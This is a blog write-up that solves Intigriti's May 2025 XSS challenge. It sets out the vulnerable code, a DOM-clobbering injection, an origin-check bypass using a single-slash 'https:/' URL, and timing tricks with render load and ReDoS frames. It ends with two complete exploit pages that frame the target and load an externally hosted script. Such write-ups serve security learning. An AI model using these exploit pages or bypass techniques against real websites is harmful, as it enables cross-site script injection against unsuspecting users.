---
title: "Intigriti January Challenge 0525"
date: 2024-05-14 05:05:00 +0530
author: piyush
image: /assets/img/posts/intichall/0525/0525.png
categories: [CTF, XSS]
tags: [ctf, xss, initigriti]
---

---
I thoroughly enjoyed tackling this month’s [CTF challenge](https://challenge-0525.intigriti.io/) hosted by [@Intigriti](https://x.com/intigriti) and skillfully crafted by [@joaxcar](https://bsky.app/profile/joaxcar.bsky.social). It took me about six hours to solve from start to finish.

Let’s dive right in — 
## 🔍 Here’s the code we needed to exploit with an XSS:


```js
// utils
function safeURL(url){
 let normalizedURL = new URL(url, location)
 return normalizedURL.origin === location.origin
}

function addDynamicScript() {
    const src = window.CONFIG_SRC?.dataset["url"] || location.origin + "/confetti.js"
    if(safeURL(src)){
        const script = document.createElement('script');
        script.src = new URL(src);
        document.head.appendChild(script);
    }
}

// main
(function(){
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');

    if (name && name.match(/([a-zA-Z0-9]+|\s)+$/)) {
        const messageDiv = document.getElementById('message');
        const spinner = document.createElement('div');
        spinner.classList.add('spinner');
        messageDiv.appendChild(spinner);

        fetch(`/message?name=${encodeURIComponent(name)}`)
        .then(response => response.text())
        .then(data => {
            spinner.remove();
            messageDiv.innerHTML = DOMPurify.sanitize(data);
        })
        .catch(err => {
            spinner.remove();
            messageDiv.innerHTML = "Error fetching message.";
            console.error('Error fetching message:', err);
        });
        
    } else if(name) {
        const messageDiv = document.getElementById('message');
        messageDiv.innerHTML = "Error when parsing name";
    }

    // Load some non-misison-critical content
    requestIdleCallback(addDynamicScript);
})();
```
## 👀 Initial Observations
Initially, it seemed quite challenging and secure—with origin validation and the OG DOMPurify, bypassing it looked nearly impossible. However, as I examined the code line by line, the very first thing that caught my attention was this:


```js
const src = window.CONFIG_SRC?.dataset["url"] || location.origin + "/confetti.js"
```

This part seemed suspicious, and I quickly understood that DOM clobbering would be needed to define `CONFIG_SRC`. At first, I tried injecting HTML elements, but the regex filter blocked those attempts. However, on closer inspection, I realized the regex was bypassable—it lacked a `^` anchor, so it didn’t enforce checks from the input’s start. For example, a string like `</strong> Some text` would pass because the regex only validates from where it begins to “make sense.” After bypassing the regex, I was eager to inject elements into the DOM. To clobber `CONFIG_SRC`, I inserted a `div` with an `id` of `CONFIG_SRC` and a custom data attribute, like this:


```html
<div id='CONFIG_SRC' data-url='https://example.com'>
```

## ⏱️ The requestIdleCallback and Origin validation Problem

`data-url` was used because the JS was trying to get the URL from the dataset attribute named `url`. I injected the above payload and was pretty confident it would work, but it didn't. While debugging, I found that `window.CONFIG_SRC` was still undefined even though the element existed in the DOM. **I was like, what the heck?** If it’s in the DOM, why isn’t it working? After a while, I noticed that `addDynamicScript` was used as a callback to this strange function `requestIdleCallback`. I tried researching it, but there isn’t much info online. From the MDN docs, I understood that it calls a function only when the event loop is idle—basically to run non-essential tasks without blocking the main thread during busy rendering or other important operations. I realized it runs when the fetch request is sent and waiting for a response. Since fetch is asynchronous and doesn’t block the main thread, the thread remains mostly free while fetch waits, so `addDynamicScript` executes before the fetch completes.

After hours of frustration, I concluded I had to delay the execution of `addDynamicScript` by keeping the main thread busy for a while. I tried messing with the regex to trigger a ReDoS attack, but that didn’t work at the time (more on this later). I also considered speeding up the fetch call instead. This is where caching helped: I injected a cache header via Burp, retried the attack, and it worked because the fetch response came almost instantly. The tricky part was figuring out how to get it cached. After struggling, I realized it was a rabbit hole and decided to use Burp’s custom header injection to let the cache work and move on to the next step—bypassing the origin check done in `safeURL`.


```js
function safeURL(url){
 let normalizedURL = new URL(url, location)
 return normalizedURL.origin === location.origin
}

function addDynamicScript() {
    const src = window.CONFIG_SRC?.dataset["url"] || location.origin + "/confetti.js"
    if(safeURL(src)){
        const script = document.createElement('script');
        script.src = new URL(src);
        document.head.appendChild(script);
    }
}
```

I had an inkling that this could be bypassed due to differences in how the `URL` constructor was implemented in the two functions—I was sure there had to be some inconsistency. I quickly opened devtools and started debugging the variable values. After about an hour of debugging and fuzzing, I managed to bypass it with this payload:


```
https:/example.com/
```

Notice that only one `/` is used after `https:`, which tricks the `URL` constructor into treating it as a relative URL and appending it to `window.location`. When it compares the origins of both URLs, they appear the same. But if the URL is passed without an origin, the constructor is forced to parse and correct the `/` issue. Voilà! This bypasses the origin check, allowing a JS file hosted on any domain to serve as our XSS payload and trigger an alert. However, it wasn’t that simple—I still had to bypass the `requestIdleCallback` mechanism.

At this point, I looked for hints posted by Intigriti, but none made sense to me at the time. The only takeaway was that I needed to manipulate some form of window isolation or something along those lines.

```
You are keeping your windows isolated right?
```

I wasn’t quite sure what the hints were pointing to at first. Then I noticed the page didn’t have any headers or protections against framing. I figured framing might help, so I tried framing it and loaded some render-heavy elements to keep the event loop busy. After some attempts, I managed to trigger an alert in Chrome. But from the Discord server, I knew the real nightmare was getting it to work on Firefox. Sure enough, it didn’t work there.

## 🌐 Exploit - Chrome
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Exploit</title>
  </head>
  <body>
    <iframe
      width="100%"
      height="500%"
      src="https://challenge-0525.intigriti.io/index.html?name=%3C/strong%3E%3Cdiv%20id=CONFIG_SRC%20data-url=%22https:/temp.staticsave.com/6821d52de70e4.js%22%3Ell%3C/div%3Edcsd"
    ></iframe>
    <div class="container"></div>

    <script>
      async function run() {
        var ele = ` <svg width="10000" height="10000">
        <g>
          <circle cx="1" cy="1" r="1" fill="red" />
          <circle cx="2" cy="2" r="1" fill="blue" />
          <circle cx="3" cy="3" r="1" fill="green" />
        </g>
      </svg>`;
        var container = document.querySelector(".container");
        container.innerHTML = ele;
        // This will force the browser to render the SVG
        // and block the main thread
        for (var i = 0; i < 1200; i++) {
          container.innerHTML += ele;
        }
      }
      setTimeout(run, 2);
    </script>
  </body>
</html>
```

## 🧩 The Final Puzzle — Firefox
Side note: when I do CTFs or hack, I follow a general approach — first get the idea, then implement it; if it fails, dig into the root cause, fix it if possible, or move on. So I tested the idea in Firefox, it failed, and I got curious why. After digging deeper, I concluded Firefox runs the challenge frame in a separate thread because the parent and child are cross-origin. It’s not that simple, but for brevity, let’s assume it’s due to the cross-origin nature of the parent page and child frame \([more here](https://hassansin.github.io/shared-event-loop-among-same-origin-windows)\).

This left me stumped. I tried finding gadgets on the challenge page to bridge the gap, but there were none, and from the cross-origin parent page, I had no way to influence that other thread.

I reached out to Johan and he told me what I was looking for was in the hints. For some reason, my brain immediately flashed back to an error I’d seen earlier while messing with the regex. The error was:

```
Uncaught InternalError: too much recursion
```
This happened because the `name` parameter was too long for the regex to process, causing the thread to stay busy. I realized this was the solution and quickly started implementing it. After several attempts, I managed to trigger the XSS by framing multiple ReDoS payloads along with one frame containing the actual XSS payload.

## 🧨 The dirty code:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Exploit</title>
  </head>
  <body>
    <iframe
      width="50%"
      height="100%"
      src="https://challenge-0525.intigriti.io/index.html?name=%3C/strong%3E%3Cdiv%20id=CONFIG_SRC%20data-url=%22https:/temp.staticsave.com/6821d52de70e4.js%22%3Ell%3C/div%3Edcsd"
    ></iframe>
    <div class="container"></div>

    <script>
      function addRedosFrames() {
        var ele = `<iframe
      width="50%"
      height="100%"
      src="https://challenge-0525.intigriti.io/index.html?name=wededwedwedwed25%32%36%25%36%34%25%36%ewdewedwedwedwedwedwedwededw33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30%25%32%36%25%36%34%25%36%33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%255%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%%33%38%5%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%5%ffsdcdcsdsdcsdcdscdcsccsdcsdcscsdcd9876543456&&name=dcsdcscdsc"
    ></iframe>`;
        var container = document.querySelector(".container");
        container.innerHTML = ele;
        for (var i = 0; i < 5; i++) {
          container.innerHTML += ele;
        }
      }

      setTimeout(addRedosFrames, 50);
    </script>
  </body>
</html>
```

## ✅ Summary

This challenge tested everything—DOM clobbering, timing issues, browser parsing quirks, and cross-browser compatibility. Major props to [@joaxcar](https://bsky.app/profile/joaxcar.bsky.social) for crafting such a clever scenario.

Until next time, happy hacking! 🐞